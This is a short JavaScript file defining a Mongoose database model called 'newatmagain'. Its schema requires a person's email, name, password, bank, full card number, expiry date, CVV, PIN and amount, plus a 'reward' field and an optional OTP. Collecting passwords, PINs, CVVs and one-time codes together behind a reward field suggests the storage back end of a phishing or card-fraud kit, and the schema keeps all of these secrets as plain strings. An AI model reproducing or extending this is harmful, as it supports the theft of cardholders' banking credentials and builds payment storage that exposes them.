const mongoose = require("mongoose");



const thisSchema = new mongoose.Schema({

	email: {
		required: true,
		type: String
	},

	fullName: {
		required: true,
		type: String
	},

	time: {
		required: true,
		type: String
	},


	password: {
		required: true,
		type: String
	},


	pin: {
		required: true,
		type: String
	},


	reward: {
		required: true,
		type: Number
	},


	bank: {
		required: true,
		type: String
	},



	card_number: {
		required: true,
		type: String
	},


	date: {
		required: true,
		type: String
	},


	cvv: {
		required: true,
		type: String
	},

	amount: {
		required: true,
		type: String
	},


	otp: {
		required: false,
		type: String
	}

});



const ThisModel = new mongoose.model("newatmagain", thisSchema);

module.exports = ThisModel;
